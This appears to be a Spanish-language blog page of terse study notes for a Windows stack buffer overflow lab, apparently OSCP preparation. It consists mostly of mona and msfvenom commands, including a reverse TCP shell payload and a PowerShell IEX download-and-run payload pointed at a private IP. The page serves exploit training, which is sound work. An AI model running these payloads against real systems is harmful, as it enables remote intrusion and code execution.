---
title: 'Buffer Overflow (hands-on)'
description: ''
pubDate: 'Jul 08 2022'
slug: 'buffer-overflow/code'
---

[Guia de Tib3rius para el OSCP](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

```bash
# A ASM version of the executable
objdump -d -Mintel goodpw.exe > disassembled

!mona config -set workingfolder C:/User/printer/Desktop

# Cuando payload = offset + eip + b"C"*200 van al espcreamos nuestro bytearray para ver badchars lo pasamos con impacket-smbserver
# impacket-smbserver smbfolder $(pwd) -smb2support

!mona bytearray -cpb "\x00" -> insted 'C' string

!mona compare -a 0xESP -f C:\Users\printer\bytearray.bin

# eip ya tienes off_set, EIP +  B"\x90"*20=space  ,  bad chars shellcode msfvenom

!mona modules

eip = pack("<L", 0xFIND)

eip se encuetra = !mona find -s "\xFF\xE4" -m minishare.exe | SLMFC.DLL

# si no encuentra : !mona findwild -s "JMP ESP" te vas a la pestaña 'l' nos cojemos el puntero q no tenga badchars y lo pegamos en minuscula el addrs en nuestro script que corresponde a pack('<L', 0xaddrs_pointer)

msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.0.8 LPORT=443 -f c -e x86/shikata_ga_nai EXITFUNC=thread -b "\x00\x0a\x0d"

/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

jmp ESP
#o alternativa con nods
sub esp,0x10

!mona modules

trick: if to many bad char remove -e x86/shikata_ga_nai

msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http
://192.168.0.8/PS.ps1')" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\
x0d' EXITFUNC=thread

nishang Incoke.powershelltcp.ps1
```
